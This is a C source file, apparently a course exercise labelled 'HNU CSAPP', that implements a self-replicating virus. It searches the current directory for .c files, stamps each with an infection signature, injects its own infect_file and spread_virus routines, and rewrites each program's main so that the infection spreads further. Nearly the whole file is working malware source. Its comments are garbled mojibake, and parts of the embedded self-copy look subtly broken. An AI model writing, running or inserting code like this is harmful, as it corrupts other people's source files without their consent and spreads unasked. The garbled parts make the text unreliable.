// INFECTED BY HNU CSAPP VIRUS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>

#define VIRUS_SIGNATURE "// INFECTED BY HNU CSAPP VIRUS\n"
#define MAX_LINE_LENGTH 256

void infect_file(const char *filename) {
	FILE *file = fopen(filename, "r");
	if (!file) {
		printf("Failed to open file: %s\n", filename);
		return;
	}

	// l
	char line[MAX_LINE_LENGTH];
	int infected = 0;
	while (fgets(line, sizeof(line), file)) {
		if (strstr(line, VIRUS_SIGNATURE)) {
			infected = 1;
			break;
		}
	}
	fclose(file);

	if (infected) {
		printf("File already infected: %s\n", filename);
		return;
	}

	// ¯¡l
	FILE *original = fopen(filename, "r");
	FILE *temp = tmpfile();
	if (!original || !temp) {
		printf("Error processing file: %s\n", filename);
		fclose(original);
		return;
	}

	// l main 
	int has_main = 0;
	while (fgets(line, sizeof(line), original)) {
		if (strstr(line, "int main(")) {
			has_main = 1;
		}
		fprintf(temp, "%s", line);
	}
	fclose(original);

	if (!has_main) {
		printf("No main function found in: %s\n", filename);
		return;
	}

	// l
	fseek(temp, 0, SEEK_SET);

	// ul
	FILE *new_file = fopen(filename, "w");
	if (!new_file) {
		printf("Failed to create new file: %s\n", filename);
		fclose(temp);
		return;
	}

	// 
	fprintf(new_file, "%s", VIRUS_SIGNATURE);

	//  infect_file  spread_virus K
	fprintf(new_file, "#include <stdio.h>\n");
	fprintf(new_file, "#include <stdlib.h>\n");
	fprintf(new_file, "#include <string.h>\n");
	fprintf(new_file, "#include <dirent.h>\n");
	fprintf(new_file, "#include <sys/stat.h>\n");
	fprintf(new_file, "\n");
	fprintf(new_file, "#define VIRUS_SIGNATURE \"// INFECTED BY HNU CSAPP VIRUS\\n\"\n");
	fprintf(new_file, "void infect_file(const char *filename);\n");
	fprintf(new_file, "void spread_virus();\n");
	fprintf(new_file, "\n");
	fprintf(new_file, "void infect_file(const char *filename) {\n");
	fprintf(new_file, "    FILE *file = fopen(filename, \"r\");\n");
	fprintf(new_file, "    if (!file) {\n");
	fprintf(new_file, "        printf(\"Failed to open file: %%s\\n\", filename);\n");
	fprintf(new_file, "        return;\n");
	fprintf(new_file, "    }\n");
	fprintf(new_file, "\n");
	fprintf(new_file, "    // l\n");
	fprintf(new_file, "    char line[256];\n");
	fprintf(new_file, "    int infected = 0;\n");
	fprintf(new_file, "    while (fgets(line, sizeof(line), file)) {\n");
	fprintf(new_file, "        if (strstr(line, VIRUS_SIGNATURE)) {\n");
	fprintf(new_file, "            infected = 1;\n");
	fprintf(new_file, "            break;\n");
	fprintf(new_file, "        }\n");
	fprintf(new_file, "    }\n");
	fprintf(new_file, "    fclose(file);\n");
	fprintf(new_file, "\n");
	fprintf(new_file, "    if (infected) {\n");
	fprintf(new_file, "        printf(\"File already infected: %%s\\n\", filename);\n");
	fprintf(new_file, "        return;\n");
	fprintf(new_file, "    }\n");
	fprintf(new_file, "\n");
	fprintf(new_file, "    // ¯¡l\n");
	fprintf(new_file, "    FILE *original = fopen(filename, \"r\");\n");
	fprintf(new_file, "    FILE *temp = tmpfile();\n");
	fprintf(new_file, "    if (!original || !temp) {\n");
	fprintf(new_file, "        printf(\"Error processing file: %%s\\n\", filename);\n");
	fprintf(new_file, "        fclose(original);\n");
	fprintf(new_file, "        return;\n");
	fprintf(new_file, "    }\n");
	fprintf(new_file, "\n");
	fprintf(new_file, "    // l main \n");
	fprintf(new_file, "    int has_main = 0;\n");
	fprintf(new_file, "    while (fgets(line, sizeof(line), original)) {\n");
	fprintf(new_file, "        if (strstr(line, \"int main(\")) {\n");
	fprintf(new_file, "            has_main = 1;\n");
	fprintf(new_file, "        }\n");
	fprintf(new_file, "        fprintf(temp, \"%%s\", line);\n");
	fprintf(new_file, "    }\n");
	fprintf(new_file, "    fclose(original);\n");
	fprintf(new_file, "\n");
	fprintf(new_file, "    if (!has_main) {\n");
	fprintf(new_file, "        printf(\"No main function found in: %%s\\n\", filename);\n");
	fprintf(new_file, "        return;\n");
	fprintf(new_file, "    }\n");
	fprintf(new_file, "\n");
	fprintf(new_file, "    // l\n");
	fprintf(new_file, "    fseek(temp, 0, SEEK_SET);\n");
	fprintf(new_file, "\n");
	fprintf(new_file, "    // ul\n");
	fprintf(new_file, "    FILE *new_file = fopen(filename, \"w\");\n");
	fprintf(new_file, "    if (!new_file) {\n");
	fprintf(new_file, "        printf(\"Failed to create new file: %%s\\n\", filename);\n");
	fprintf(new_file, "        fclose(temp);\n");
	fprintf(new_file, "        return;\n");
	fprintf(new_file, "    }\n");
	fprintf(new_file, "\n");
	fprintf(new_file, "    // \n");
	fprintf(new_file, "    fprintf(new_file, \"%%s\", VIRUS_SIGNATURE);\n");
	fprintf(new_file, "\n");
	fprintf(new_file, "    // \n");
	fprintf(new_file, "    fprintf(new_file, \"#include <stdio.h>\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"#include <stdlib.h>\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"#include <string.h>\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"#include <dirent.h>\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"#include <sys/stat.h>\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"\\n\");\n");
	fprintf(new_file,
	        "    fprintf(new_file, \"#define VIRUS_SIGNATURE \\\"// INFECTED BY HNU CSAPP VIRUS\\\\n\\\"\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"void infect_file(const char *filename);\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"void spread_virus();\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"void spread_virus() {\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"    DIR *dir = opendir(\\\".\\\");\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"    if (!dir) {\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"        printf(\\\"Failed to open directory\\n\\\");\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"        return;\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"    }\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"    struct dirent *entry;\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"    struct stat file_stat;\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"    while ((entry = readdir(dir)) != NULL) {\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"        if (stat(entry->d_name, &file_stat) == 0) {\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"            if (S_ISREG(file_stat.st_mode)) { // l\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"                const char *filename = entry->d_name;\\n\");\n");
	fprintf(new_file,
	        "    fprintf(new_file, \"                if (strstr(filename, \\\".c\\\") && strcmp(filename, __FILE__)) {\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"                    infect_file(filename);\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"                }\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"            }\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"        }\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"    }\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"    closedir(dir);\\n\");\n");
	fprintf(new_file, "    fprintf(new_file, \"}\\n\");\n");
	fprintf(new_file, "\n");
	fprintf(new_file, "    // ¯¡l\n");
	fprintf(new_file, "    int isLeft = 0;\n");
	fprintf(new_file, "    while (fgets(line, sizeof(line), temp)) {\n");
	fprintf(new_file, "        if (strstr(line, \"int main(\")) {\n");
	fprintf(new_file, "            // ¯¡ main K\n");
	fprintf(new_file, "            continue;\n");
	fprintf(new_file, "        }\n");
	fprintf(new_file, "        if (strstr(line, \"{\") && isLeft == 0) {\n");
	fprintf(new_file, "            // l?{, l\n");
	fprintf(new_file, "            isLeft = 1;\n");
	fprintf(new_file, "            continue;\n");
	fprintf(new_file, "        }\n");
	fprintf(new_file, "        fprintf(new_file, \"%%s\", line);\n");
	fprintf(new_file, "    }\n");
	fprintf(new_file, "\n");
	fprintf(new_file, "    // l\n");
	fprintf(new_file, "    fclose(temp);\n");
	fprintf(new_file, "    fclose(new_file);\n");
	fprintf(new_file, "\n");
	fprintf(new_file, "    printf(\"File infected: %%s\\n\", filename);\n");
	fprintf(new_file, "}\n");
	fprintf(new_file, "\n");
	fprintf(new_file, "void spread_virus() {\n");
	fprintf(new_file, "    DIR *dir = opendir(\".\");\n");
	fprintf(new_file, "    if (!dir) {\n");
	fprintf(new_file, "        printf(\"Failed to open directory\\n\");\n");
	fprintf(new_file, "        return;\n");
	fprintf(new_file, "    }\n");
	fprintf(new_file, "\n");
	fprintf(new_file, "    struct dirent *entry;\n");
	fprintf(new_file, "    struct stat file_stat;\n");
	fprintf(new_file, "\n");
	fprintf(new_file, "    while ((entry = readdir(dir)) != NULL) {\n");
	fprintf(new_file, "        if (stat(entry->d_name, &file_stat) == 0) {\n");
	fprintf(new_file, "            if (S_ISREG(file_stat.st_mode)) { // l\n");
	fprintf(new_file, "                const char *filename = entry->d_name;\n");
	fprintf(new_file, "                if (strstr(filename, \".c\") && strcmp(filename, __FILE__)) {\n");
	fprintf(new_file, "                    infect_file(filename);\n");
	fprintf(new_file, "                }\n");
	fprintf(new_file, "            }\n");
	fprintf(new_file, "        }\n");
	fprintf(new_file, "    }\n");
	fprintf(new_file, "\n");
	fprintf(new_file, "    closedir(dir);\n");
	fprintf(new_file, "}\n");
	fprintf(new_file, "\n");
	fprintf(new_file, "int main(int argc, char *argv[]) {\n");
	fprintf(new_file, "    printf(\"Welcome to HNU CSAPP!\\n\");\n");
	fprintf(new_file, "    spread_virus();\n");

	// ¯¡l
	int isLeft = 0;
	while (fgets(line, sizeof(line), temp)) {
		if (strstr(line, "int main(")) {
			// ¯¡ main K
			continue;
		}
		if (strstr(line, "{") && isLeft == 0) {
			// l?"{", l
			isLeft = 1;
			continue;
		}
		fprintf(new_file, "%s", line);
	}

	// l
	fclose(temp);
	fclose(new_file);

	printf("File infected: %s\n", filename);
}

void spread_virus() {
	DIR *dir = opendir(".");
	if (!dir) {
		printf("Failed to open directory\n");
		return;
	}

	struct dirent *entry;
	struct stat file_stat;

	while ((entry = readdir(dir)) != NULL) {
		if (stat(entry->d_name, &file_stat) == 0) {
			if (S_ISREG(file_stat.st_mode)) { // l
				const char *filename = entry->d_name;
				if (strstr(filename, ".c") && strcmp(filename, __FILE__)) {
					infect_file(filename);
				}
			}
		}
	}

	closedir(dir);
}

int main(int argc, char *argv[]) {
	printf("Welcome to HNU CSAPP!\n");
	spread_virus();

	// ¯¡
	printf("Original program functionality executed.\n");

	return 0;
}